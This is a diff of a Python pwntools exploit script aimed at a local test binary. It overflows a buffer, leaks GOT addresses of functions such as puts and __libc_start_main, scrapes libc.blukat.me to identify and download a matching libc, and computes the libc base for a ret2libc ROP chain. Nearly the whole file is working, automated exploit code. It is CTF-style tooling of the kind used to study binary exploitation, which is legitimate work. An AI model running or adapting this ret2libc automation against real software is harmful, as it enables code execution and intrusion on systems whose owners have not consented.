@@ -1,12 +1,20 @@
 from pwn import *
+import requests
+from bs4 import BeautifulSoup
+import os
+import shutil
+
 #context.log_level = 'debug'
 class Exploit:
 	def __init__(self):
 		self.elf = ELF("./tests/ret")
 		self.offset_leaking = self.elf.process()
 		self.rop = ROP(self.elf)
+		self.url_find_libc = "https://libc.blukat.me/?q="
+		self.url_download_libc = "https://libc.blukat.me/d/"
+		os.path.join(os.getcwd(), "libc")
 		#script = """
-		#b *0x0000000000401185
+		#b *0x00000000004006e7
 		#"""
 		#self.p = self.elf.debug(gdbscript=script)
 		self.p = self.elf.process()
@@ -36,35 +44,56 @@ class Exploit:
 			b"A"*offset,
 			instance.chain()
 		]
-		print(payload)
 		payload = b"".join(payload)
 		return payload
 
+	def join_cwd(self, path):
+		return os.path.join(os.getcwd(), path)
+
 	def main(self):
 		offset = self.offset_finder(self.offset_leaking)
-
 		self.p.recv()
-
+		log.info("Leaking available address...")
 		available_funcs = tuple(name for name in self.elf.got.keys() if name in ['puts', 'gets', 'printf', 'read', '__libc_start_main'])
 		for func in available_funcs:
 			self.recovery(self.rop,f"No {func} in GOT", self.elf.symbols["puts"], [self.elf.got[func]])
 		self.recovery(self.rop,f"No main found...", self.elf.symbols["main"])
-		
 		payload1 = self.payload_generator(self.rop,offset)
 		self.p.sendline(payload1)
-
+		leaked_addr_list = []
 		for name in available_funcs: 
 			leaked = u64(self.p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
 			log.info(f"{name} @ {hex(leaked)}")
+			name_leaked = name+":"+hex(leaked)
+			leaked_addr_list.append(name_leaked)
+		log.info("Looking for a libc...")
+		leaked_addr = ",".join(leaked_addr_list)
+		page = requests.get(self.url_find_libc+leaked_addr)
+		soup = BeautifulSoup(page.content,"html.parser")
+		scrap = soup.find(class_="lib-item")
+		libc_found = "".join(scrap.text.split()) + ".so"
+		log.info("Found a LIBC that could work (found it on https://libc.blukat.me/).")
+		log.info("Testing with following LIBC: " + libc_found)
 		
-		LIBC = "./libc/libc6_2.31-0ubuntu9.2_amd64.so"
-		if LIBC:
-			libc = ELF(LIBC)
-			libc.address = leaked - libc.symbols[available_funcs[-1]]
-			log.info(f"base libc {hex(libc.address)}")
+		if libc_found != "":
+			if (libc_found) not in os.listdir('./libc/'):
+				log.info("Downloading libc... Could take some time depending of your internet")
+				req = requests.get(self.url_download_libc+libc_found, allow_redirects=True)
+				open(libc_found,'wb').write(req.content)
+				LIBC = "./libc/" + str(libc_found)
+				src = self.join_cwd(libc_found)
+				to = self.join_cwd(os.path.join("libc", libc_found))
+				shutil.move(src, to)
+			else:
+				log.info('LIBC already downloaded previously')
+				LIBC = "./libc/" + str(libc_found)
+			if LIBC:
+				libc = ELF(LIBC) 
+				libc.address = leaked - libc.symbols[available_funcs[-1]]
+				log.info(f"base libc {hex(libc.address)}")
 		else:
-			log.warning("No LIBC set. Please go to https://libc.blukat.me/")
-			exit()
+			log.warning("Couldn't find LIBC... Aborting.")
+			exit(-1)
 
 		roplibc = ROP(libc)
 		self.recovery(roplibc, "Couldn't find ret", roplibc.find_gadget(["ret"]))
